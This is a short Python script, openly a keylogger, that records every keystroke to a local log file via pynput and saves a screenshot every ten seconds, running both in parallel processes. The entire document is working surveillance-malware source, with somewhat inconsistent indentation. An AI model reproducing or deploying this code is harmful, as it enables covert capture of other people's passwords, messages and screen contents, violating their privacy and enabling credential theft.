from multiprocessing import Process
from pynput import keyboard
import pyscreenshot as ImageGrab
import time, datetime, sys, os

LOG_FILE = '/home/vpatel95/keylogger/keys.log'

def keyPress(key):
    with open(LOG_FILE,'a') as f:
	    try: 
	    	if key.char != None:
	        	f.write(key.char)
	    except AttributeError:
	        if key == keyboard.Key.space:
	            f.write(' ')
	        elif key == keyboard.Key.backspace:
	            f.seek(0, 2)
	            size = f.tell()
	            if(size > 0):
	            	f.truncate(size-1)
	        elif key == keyboard.Key.enter:
	        	f.write('\n')
	       	else:
	       		pass

def getDir():
	os.getcwd()
	try:
		os.chdir('screenshots')
	except FileNotFoundError:
		os.mkdir('screenshots')
		os.chdir('screenshots')

def getTime():
	st = time.strftime('%H:%M:%S_%Y-%m-%d.png')
	return st

def takeScreenShot():
	var = 1
	getDir()
	while var == 1:
		im = ImageGrab.grab()
		ts = getTime()
		im.save(ts)
		time.sleep(10)

def keyLogging():
	with keyboard.Listener(on_press=keyPress) as listener:
		listener.join()

if __name__=='__main__':
	screenshot = Process(target = takeScreenShot)
	screenshot.start()
	keylog = Process(target = keyLogging)
	keylog.start()
